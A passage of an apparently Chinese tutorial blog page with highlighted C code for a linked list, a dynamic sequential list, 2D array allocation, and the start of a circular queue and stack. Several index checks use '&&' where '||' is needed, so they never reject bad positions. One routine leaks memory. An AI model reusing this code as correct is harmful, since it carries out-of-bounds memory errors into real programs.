punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">delect</span><span class="token punctuation">(</span>node <span class="token operator">*</span>head<span class="token punctuation">,</span><span class="token keyword">int</span> i<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>node <span class="token operator">*</span>p<span class="token punctuation">,</span><span class="token operator">*</span>q<span class="token punctuation">;</span>p <span class="token operator">=</span> head<span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span>j <span class="token operator">&lt;</span> i <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">&amp;&amp;</span> p <span class="token operator">-></span> next<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>p <span class="token operator">=</span> p <span class="token operator">-></span> next<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span>j <span class="token operator">==</span> i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>q <span class="token operator">=</span> <span class="token punctuation">(</span>node <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>q <span class="token operator">=</span>  p<span class="token operator">-></span>next<span class="token punctuation">;</span>p<span class="token operator">-></span>next <span class="token operator">=</span> p<span class="token operator">-></span>next<span class="token operator">-></span>next<span class="token punctuation">;</span><span class="token function">free</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>node <span class="token operator">*</span>head<span class="token punctuation">;</span><span class="token keyword">int</span> len<span class="token punctuation">;</span><span class="token function">csh</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>head<span class="token punctuation">)</span><span class="token punctuation">;</span>len <span class="token operator">=</span> <span class="token function">length</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"length:%3d\n"</span><span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> i<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">5</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">insert</span><span class="token punctuation">(</span>head<span class="token punctuation">,</span>i<span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>len <span class="token operator">=</span> <span class="token function">length</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"length:%3d\n  数据为:%3d\n"</span><span class="token punctuation">,</span>len<span class="token punctuation">,</span>head<span class="token operator">-></span>next<span class="token operator">-></span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>datatype x<span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token function">length</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">select</span><span class="token punctuation">(</span>head<span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token operator">&amp;</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"  数据为:%3d "</span><span class="token punctuation">,</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token function">delect</span><span class="token punctuation">(</span>head<span class="token punctuation">,</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span>len <span class="token operator">=</span> <span class="token function">length</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nlength:%3d\n"</span><span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>datatype y<span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token function">length</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">select</span><span class="token punctuation">(</span>head<span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token operator">&amp;</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"   数据为:%3d"</span><span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="顺序表-1"><a href="#顺序表-1" class="headerlink" title="顺序表"></a>顺序表</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;malloc.h></span></span><span class="token keyword">typedef</span> <span class="token keyword">int</span> datatype<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">InitSize</span> <span class="token expression"><span class="token number">10</span> </span><span class="token comment">//最大长度</span></span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token comment">//动态顺序表</span><span class="token punctuation">&#123;</span>    datatype <span class="token operator">*</span>data<span class="token punctuation">;</span> <span class="token comment">//指针</span>    <span class="token keyword">int</span> length<span class="token punctuation">;</span> <span class="token comment">//长度</span>    <span class="token keyword">int</span> Maxsize<span class="token punctuation">;</span> <span class="token comment">//最大长度</span><span class="token punctuation">&#125;</span> SeqList<span class="token punctuation">;</span><span class="token comment">/* typedef struct //静态顺序表&#123;datatype a;int length;&#125; xxb; */</span><span class="token keyword">void</span> <span class="token function">InitList</span><span class="token punctuation">(</span>SeqList <span class="token operator">*</span>L<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">//初始化</span>    L<span class="token operator">-></span>data<span class="token operator">=</span><span class="token punctuation">(</span>datatype <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>datatype<span class="token punctuation">)</span><span class="token operator">*</span>InitSize<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//开辟空间</span>    L<span class="token operator">-></span>length<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">//长度</span>    L<span class="token operator">-></span>Maxsize<span class="token operator">=</span>InitSize<span class="token punctuation">;</span> <span class="token comment">//最大长度</span><span class="token punctuation">&#125;</span><span class="token comment">/* void InitList(SeqList *L)&#123;L->length=0;for(int i=0;i&lt;InitSize;i++)&#123;L->a[i]=i;&#125;&#125; */</span><span class="token keyword">void</span> <span class="token function">IncreaseSize</span><span class="token punctuation">(</span>SeqList <span class="token operator">*</span>L<span class="token punctuation">,</span><span class="token keyword">int</span> len<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">//增加数组长度</span>    datatype <span class="token operator">*</span>p<span class="token operator">=</span>L<span class="token operator">-></span>data<span class="token punctuation">;</span> <span class="token comment">//保存数组的值</span>    L<span class="token operator">-></span>data<span class="token operator">=</span><span class="token punctuation">(</span>datatype <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>datatype<span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>L<span class="token operator">-></span>Maxsize<span class="token operator">+</span>len<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//增大空间</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>L<span class="token operator">-></span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        L<span class="token operator">-></span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>p<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//将数值添加到增大空间后的数组</span>    <span class="token punctuation">&#125;</span>    L<span class="token operator">-></span>Maxsize<span class="token operator">=</span>L<span class="token operator">-></span>Maxsize<span class="token operator">+</span>len<span class="token punctuation">;</span> <span class="token comment">//修改最大的长度</span>    <span class="token function">free</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//释放用来保存数据的空间</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">ListInsert</span><span class="token punctuation">(</span>SeqList <span class="token operator">*</span>L<span class="token punctuation">,</span><span class="token keyword">int</span> i<span class="token punctuation">,</span>datatype e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">//插入一个数</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token operator">&lt;</span><span class="token number">0</span> <span class="token operator">&amp;&amp;</span> i<span class="token operator">></span>L<span class="token operator">-></span>length<span class="token punctuation">)</span> <span class="token operator">||</span> L<span class="token operator">-></span>length <span class="token operator">==</span> L<span class="token operator">-></span>Maxsize<span class="token punctuation">)</span> <span class="token comment">//判断插入位置是否合理</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span>L<span class="token operator">-></span>length<span class="token punctuation">;</span>j<span class="token operator">>=</span>i<span class="token punctuation">;</span>j<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        L<span class="token operator">-></span>data<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span>L<span class="token operator">-></span>data<span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//所有数往后移一位</span>    <span class="token punctuation">&#125;</span>    L<span class="token operator">-></span>data<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>e<span class="token punctuation">;</span> <span class="token comment">//插入数</span>    L<span class="token operator">-></span>length<span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">//插入后长度+1</span>    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">ListDelete</span><span class="token punctuation">(</span>SeqList <span class="token operator">*</span>L<span class="token punctuation">,</span><span class="token keyword">int</span> i<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">//删除一个数</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">&lt;</span><span class="token number">0</span> <span class="token operator">&amp;&amp;</span> i<span class="token operator">></span>L<span class="token operator">-></span>length<span class="token punctuation">)</span> <span class="token comment">//判断位置是否合理</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token operator">*</span>e<span class="token operator">=</span>L<span class="token operator">-></span>data<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span>i<span class="token punctuation">;</span>j<span class="token operator">&lt;</span>L<span class="token operator">-></span>length<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>        L<span class="token operator">-></span>data<span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>L<span class="token operator">-></span>data<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//在删除的那个位置后面的值往移一位</span>    L<span class="token operator">-></span>length<span class="token operator">--</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>datatype <span class="token function">GetElem</span><span class="token punctuation">(</span>SeqList L<span class="token punctuation">,</span><span class="token keyword">int</span> i<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">//按位查找</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> i <span class="token operator">></span> L<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token comment">//位置合理</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> L<span class="token punctuation">.</span>data<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//直接返回数字</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">LocateElem</span><span class="token punctuation">(</span>SeqList L<span class="token punctuation">,</span><span class="token keyword">int</span> e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">//按值查找</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>L<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>L<span class="token punctuation">.</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> e<span class="token punctuation">)</span> <span class="token comment">//挨个判断</span>            <span class="token keyword">return</span> i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    SeqList L<span class="token punctuation">;</span> <span class="token comment">//L表</span>    <span class="token function">InitList</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>L<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//初始化表格</span>        <span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">;</span> <span class="token comment">//插入表的数</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>j<span class="token operator">&lt;=</span>i<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">ListInsert</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>L<span class="token punctuation">,</span>j<span class="token punctuation">,</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//插入表</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/* printf("%3d",L.length);    for (int j = 1; j &lt;= i; j++)    &#123;    printf("%2d\n",GetElem(L, j)); //按位查询    &#125;    ListInsert(&amp;L,4,6); //插入表 */</span>        <span class="token comment">/* int e;    ListDelete(&amp;L,2,&amp;e); //删除低2个    printf("%d \n",e); //删除的数据        for (int j = 1; j &lt;= L.length; j++)    &#123;    printf("%2d\n",GetElem(L, j)); //删除后的表    &#125; */</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token function">make2darray</span><span class="token punctuation">(</span><span class="token keyword">int</span> r<span class="token punctuation">,</span><span class="token keyword">int</span> c<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token operator">*</span>a<span class="token punctuation">,</span>i<span class="token punctuation">;</span>a<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>r<span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>r<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>c<span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> a<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">diliver2darray</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token operator">*</span>a<span class="token punctuation">,</span><span class="token keyword">int</span> r<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> i<span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>r<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>k<span class="token punctuation">;</span><span class="token keyword">int</span> r<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span>c<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token operator">*</span>a<span class="token punctuation">;</span>a<span class="token operator">=</span><span class="token function">make2darray</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>k <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>r<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>c<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span>k<span class="token punctuation">;</span>k<span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>r<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>c<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%5d"</span><span class="token punctuation">,</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">diliver2darray</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>r<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;malloc.h></span></span><span class="token keyword">typedef</span> <span class="token keyword">int</span> datatype<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">max</span> <span class="token expression"><span class="token number">8</span></span></span><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">&#123;</span>  datatype <span class="token operator">*</span>a<span class="token punctuation">;</span>  <span class="token keyword">int</span> f<span class="token punctuation">,</span>r<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>que<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">csh</span><span class="token punctuation">(</span>que <span class="token operator">*</span>s<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  s<span class="token operator">-></span>a<span class="token operator">=</span><span class="token punctuation">(</span>datatype <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>datatype<span class="token punctuation">)</span><span class="token operator">*</span>max<span class="token punctuation">)</span><span class="token punctuation">;</span>  s<span class="token operator">-></span>f<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>  s<span class="token operator">-></span>r<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">kong</span><span class="token punctuation">(</span>que <span class="token operator">*</span>s<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token punctuation">(</span>s<span class="token operator">-></span>f <span class="token operator">==</span> s<span class="token operator">-></span>r<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">man</span><span class="token punctuation">(</span>que <span class="token operator">*</span>s<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>s<span class="token operator">-></span>r<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span>max <span class="token operator">==</span> s<span class="token operator">-></span>f<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">rd</span><span class="token punctuation">(</span>que <span class="token operator">*</span>s<span class="token punctuation">,</span>datatype x<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">man</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>s<span class="token operator">-></span>a<span class="token punctuation">[</span>s<span class="token operator">-></span>r<span class="token punctuation">]</span> <span class="token operator">=</span> x<span class="token punctuation">;</span>s<span class="token operator">-></span>r<span class="token operator">=</span><span class="token punctuation">(</span>s<span class="token operator">-></span>r<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span>max<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">cd</span><span class="token punctuation">(</span>que <span class="token operator">*</span>s<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>x<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">kong</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token operator">*</span>x <span class="token operator">=</span> s<span class="token operator">-></span>a<span class="token punctuation">[</span>s<span class="token operator">-></span>f<span class="token punctuation">]</span><span class="token punctuation">;</span>s<span class="token operator">-></span>f<span class="token operator">=</span><span class="token punctuation">(</span>s<span class="token operator">-></span>f<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span>max<span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">&#123;</span>datatype <span class="token operator">*</span>a<span class="token punctuation">;</span><span class="token keyword">int</span> top<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>stack<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">cshz</span><span class="token punctuation">(</span>stack <span class="token operator">*</span>z<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>z<span class="token operator">-></span>a<span class="token operator">=</span><span class="token punctuation">(</span>datatype <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token 